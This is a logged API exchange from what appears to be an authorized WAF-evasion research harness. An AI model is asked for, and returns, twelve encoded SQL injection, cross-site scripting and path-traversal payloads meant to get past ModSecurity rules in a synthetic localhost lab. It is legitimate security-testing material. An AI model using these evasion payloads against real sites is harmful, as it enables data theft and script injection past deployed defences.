@@ -1,0 +1,117 @@
+{
+  "model_alias": "gpt-6-luna",
+  "role": "payload",
+  "replicate": 0,
+  "request": {
+    "model": "gpt-6-luna",
+    "messages": [
+      {
+        "role": "user",
+        "content": "Authorized isolated localhost WAF research with synthetic data only.\nBackend GET query parameter q is URL-decoded once by the framework.\n/sql: SQLite SELECT name FROM items WHERE public=1 AND name='<q>'.\nTable items has apple/public=1 and TRACE_SQL_SECRET/public=0. Oracle: secret in response.\n/xss: q inserted into HTML body without escaping. Browser oracle: window.__trace === 1.\n/file: resolve /tmp/trace-fixture/public/<q>; secret ../secret.txt contains TRACE_FILE_SECRET.\n/docs and /search always HTML-escape q; these are safe documentation routes.\nWAF is ModSecurity with OWASP CRS paranoia 1, inbound anomaly threshold 5.\nOnly q and the named routes may be used. Do not use external hosts or callbacks.\nReturn ONLY JSON {\"cases\":[{\"route\":\"/sql|/xss|/file\",\"q\":\"...\",\"parent_id\":\"dev seed id\",\"rationale\":\"...\"}]}.\nGenerate exactly 12 diverse candidate variants, four per attack route, from the supplied dev seeds.\nPreserve each backend oracle while exploring representation changes. All are dev data.\nDo not change database contents or access files other than the synthetic secret.\nDEV EVIDENCE:\n[{\"id\": \"dev-sql-0-raw\", \"family\": \"dev-sql-0\", \"split\": \"dev\", \"cwe\": \"CWE-89\", \"route\": \"/sql\", \"q\": \"' OR 1=1 --\", \"intended_attack\": true, \"variant\": \"raw\", \"source\": \"heuristic\"}, {\"id\": \"dev-sql-1-raw\", \"family\": \"dev-sql-1\", \"split\": \"dev\", \"cwe\": \"CWE-89\", \"route\": \"/sql\", \"q\": \"' UNION SELECT name FROM items --\", \"intended_attack\": true, \"variant\": \"raw\", \"source\": \"heuristic\"}, {\"id\": \"dev-xss-0-raw\", \"family\": \"dev-xss-0\", \"split\": \"dev\", \"cwe\": \"CWE-79\", \"route\": \"/xss\", \"q\": \"<script>window.__trace=1</script>\", \"intended_attack\": true, \"variant\": \"raw\", \"source\": \"heuristic\"}, {\"id\": \"dev-xss-1-raw\", \"family\": \"dev-xss-1\", \"split\": \"dev\", \"cwe\": \"CWE-79\", \"route\": \"/xss\", \"q\": \"<img src=x onerror=\\\"window.__trace=1\\\">\", \"intended_attack\": true, \"variant\": \"raw\", \"source\": \"heuristic\"}, {\"id\": \"dev-file-0-raw\", \"family\": \"dev-file-0\", \"split\": \"dev\", \"cwe\": \"CWE-22\", \"route\": \"/file\", \"q\": \"../secret.txt\", \"intended_attack\": true, \"variant\": \"raw\", \"source\": \"heuristic\"}, {\"id\": \"dev-file-1-raw\", \"family\": \"dev-file-1\", \"split\": \"dev\", \"cwe\": \"CWE-22\", \"route\": \"/file\", \"q\": \"public/../../secret.txt\", \"intended_attack\": true, \"variant\": \"raw\", \"source\": \"heuristic\"}, {\"id\": \"dev-benign-search-0\", \"family\": \"dev-benign-0\", \"split\": \"dev\", \"cwe\": \"CWE-89\", \"route\": \"/search\", \"q\": \"apple\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-docs-0\", \"family\": \"dev-benign-0\", \"split\": \"dev\", \"cwe\": \"CWE-79\", \"route\": \"/docs\", \"q\": \"apple\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-search-1\", \"family\": \"dev-benign-1\", \"split\": \"dev\", \"cwe\": \"CWE-89\", \"route\": \"/search\", \"q\": \"hello world\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-docs-1\", \"family\": \"dev-benign-1\", \"split\": \"dev\", \"cwe\": \"CWE-79\", \"route\": \"/docs\", \"q\": \"hello world\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-search-2\", \"family\": \"dev-benign-2\", \"split\": \"dev\", \"cwe\": \"CWE-89\", \"route\": \"/search\", \"q\": \"SQL UNION SELECT tutorial\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-docs-2\", \"family\": \"dev-benign-2\", \"split\": \"dev\", \"cwe\": \"CWE-79\", \"route\": \"/docs\", \"q\": \"SQL UNION SELECT tutorial\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-search-3\", \"family\": \"dev-benign-3\", \"split\": \"dev\", \"cwe\": \"CWE-89\", \"route\": \"/search\", \"q\": \"<script>example</script>\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-docs-3\", \"family\": \"dev-benign-3\", \"split\": \"dev\", \"cwe\": \"CWE-79\", \"route\": \"/docs\", \"q\": \"<script>example</script>\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-search-4\", \"family\": \"dev-benign-4\", \"split\": \"dev\", \"cwe\": \"CWE-89\", \"route\": \"/search\", \"q\": \"readme.txt\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-docs-4\", \"family\": \"dev-benign-4\", \"split\": \"dev\", \"cwe\": \"CWE-79\", \"route\": \"/docs\", \"q\": \"readme.txt\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-search-5\", \"family\": \"dev-benign-5\", \"split\": \"dev\", \"cwe\": \"CWE-89\", \"route\": \"/search\", \"q\": \"./readme.txt\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-docs-5\", \"family\": \"dev-benign-5\", \"split\": \"dev\", \"cwe\": \"CWE-79\", \"route\": \"/docs\", \"q\": \"./readme.txt\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-file-0\", \"family\": \"dev-file-benign-0\", \"split\": \"dev\", \"cwe\": \"CWE-22\", \"route\": \"/file\", \"q\": \"readme.txt\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-file-1\", \"family\": \"dev-file-benign-1\", \"split\": \"dev\", \"cwe\": \"CWE-22\", \"route\": \"/file\", \"q\": \"./readme.txt\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-file-2\", \"family\": \"dev-file-benign-2\", \"split\": \"dev\", \"cwe\": \"CWE-22\", \"route\": \"/file\", \"q\": \"../public/readme.txt\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}, {\"id\": \"dev-benign-file-3\", \"family\": \"dev-file-benign-3\", \"split\": \"dev\", \"cwe\": \"CWE-22\", \"route\": \"/file\", \"q\": \"missing.txt\", \"intended_attack\": false, \"variant\": \"benign\", \"source\": \"curated\"}]"
+      }
+    ],
+    "temperature": 0.7,
+    "max_tokens": 3500,
+    "stream": false
+  },
+  "started_utc": "2026-10-16T16:23:04.946609+00:00",
+  "status": 200,
+  "response": {
+    "id": "resp_022987b16315d7ff016ad24f6991b08191ab97ce7d185ae527",
+    "object": "chat.completion",
+    "created": 1792167785,
+    "model": "gpt-6-luna",
+    "choices": [
+      {
+        "index": 0,
+        "message": {
+          "role": "assistant",
+          "content": "{\"cases\":[{\"route\":\"/sql\",\"q\":\"%27 OR 1=1 --\",\"parent_id\":\"dev-sql-0-raw\",\"rationale\":\"Percent-encode the quote; one framework decode restores the original SQL predicate.\"},{\"route\":\"/sql\",\"q\":\"%27/**/OR/**/1=1/**/--\",\"parent_id\":\"dev-sql-0-raw\",\"rationale\":\"Use SQL comments as whitespace while preserving the tautology and trailing comment.\"},{\"route\":\"/sql\",\"q\":\"%27 UNION SELECT name FROM items --\",\"parent_id\":\"dev-sql-1-raw\",\"rationale\":\"Percent-encode the quote; one framework decode restores the UNION query.\"},{\"route\":\"/sql\",\"q\":\"%27/**/UNION/**/SELECT/**/name/**/FROM/**/items/**/--\",\"parent_id\":\"dev-sql-1-raw\",\"rationale\":\"Use SQL comments as token separators while retaining the UNION query.\"},{\"route\":\"/xss\",\"q\":\"%3Cscript%3Ewindow.__trace=1%3C/script%3E\",\"parent_id\":\"dev-xss-0-raw\",\"rationale\":\"Percent-encoding decodes once to the original executable script element.\"},{\"route\":\"/xss\",\"q\":\"<ScRiPt>window.__trace=1</sCrIpT>\",\"parent_id\":\"dev-xss-0-raw\",\"rationale\":\"Change tag-name casing while retaining script execution.\"},{\"route\":\"/xss\",\"q\":\"<img src=x onerror=window.__trace=1>\",\"parent_id\":\"dev-xss-1-raw\",\"rationale\":\"Remove attribute quotes; the image error handler still sets the browser oracle.\"},{\"route\":\"/xss\",\"q\":\"<svg onload=window.__trace=1>\",\"parent_id\":\"dev-xss-1-raw\",\"rationale\":\"Use an SVG load handler to set the same browser oracle.\"},{\"route\":\"/file\",\"q\":\"%2e%2e/secret.txt\",\"parent_id\":\"dev-file-0-raw\",\"rationale\":\"Encode traversal dots; one framework decode restores the secret path.\"},{\"route\":\"/file\",\"q\":\"..%2fsecret.txt\",\"parent_id\":\"dev-file-0-raw\",\"rationale\":\"Encode the traversal separator; one framework decode restores the secret path.\"},{\"route\":\"/file\",\"q\":\"public/..%2f..%2fsecret.txt\",\"parent_id\":\"dev-file-1-raw\",\"rationale\":\"Encode separators in the seeded traversal; one framework decode reaches the same secret.\"},{\"route\":\"/file\",\"q\":\"public/%2e%2e/%2e%2e/secret.txt\",\"parent_id\":\"dev-file-1-raw\",\"rationale\":\"Encode traversal components; one framework decode preserves the seeded path resolution.\"}]}"
+        },
+        "finish_reason": "stop"
+      }
+    ],
+    "usage": {
+      "prompt_tokens": 4353,
+      "completion_tokens": 593,
+      "total_tokens": 4946
+    }
+  },
+  "parsed": {
+    "cases": [
+      {
+        "route": "/sql",
+        "q": "%27 OR 1=1 --",
+        "parent_id": "dev-sql-0-raw",
+        "rationale": "Percent-encode the quote; one framework decode restores the original SQL predicate."
+      },
+      {
+        "route": "/sql",
+        "q": "%27/**/OR/**/1=1/**/--",
+        "parent_id": "dev-sql-0-raw",
+        "rationale": "Use SQL comments as whitespace while preserving the tautology and trailing comment."
+      },
+      {
+        "route": "/sql",
+        "q": "%27 UNION SELECT name FROM items --",
+        "parent_id": "dev-sql-1-raw",
+        "rationale": "Percent-encode the quote; one framework decode restores the UNION query."
+      },
+      {
+        "route": "/sql",
+        "q": "%27/**/UNION/**/SELECT/**/name/**/FROM/**/items/**/--",
+        "parent_id": "dev-sql-1-raw",
+        "rationale": "Use SQL comments as token separators while retaining the UNION query."
+      },
+      {
+        "route": "/xss",
+        "q": "%3Cscript%3Ewindow.__trace=1%3C/script%3E",
+        "parent_id": "dev-xss-0-raw",
+        "rationale": "Percent-encoding decodes once to the original executable script element."
+      },
+      {
+        "route": "/xss",
+        "q": "<ScRiPt>window.__trace=1</sCrIpT>",
+        "parent_id": "dev-xss-0-raw",
+        "rationale": "Change tag-name casing while retaining script execution."
+      },
+      {
+        "route": "/xss",
+        "q": "<img src=x onerror=window.__trace=1>",
+        "parent_id": "dev-xss-1-raw",
+        "rationale": "Remove attribute quotes; the image error handler still sets the browser oracle."
+      },
+      {
+        "route": "/xss",
+        "q": "<svg onload=window.__trace=1>",
+        "parent_id": "dev-xss-1-raw",
+        "rationale": "Use an SVG load handler to set the same browser oracle."
+      },
+      {
+        "route": "/file",
+        "q": "%2e%2e/secret.txt",
+        "parent_id": "dev-file-0-raw",
+        "rationale": "Encode traversal dots; one framework decode restores the secret path."
+      },
+      {
+        "route": "/file",
+        "q": "..%2fsecret.txt",
+        "parent_id": "dev-file-0-raw",
+        "rationale": "Encode the traversal separator; one framework decode restores the secret path."
+      },
+      {
+        "route": "/file",
+        "q": "public/..%2f..%2fsecret.txt",
+        "parent_id": "dev-file-1-raw",
+        "rationale": "Encode separators in the seeded traversal; one framework decode reaches the same secret."
+      },
+      {
+        "route": "/file",
+        "q": "public/%2e%2e/%2e%2e/secret.txt",
+        "parent_id": "dev-file-1-raw",
+        "rationale": "Encode traversal components; one framework decode preserves the seeded path resolution."
+      }
+    ]
+  },
+  "elapsed_seconds": 5.395597048001946
+}
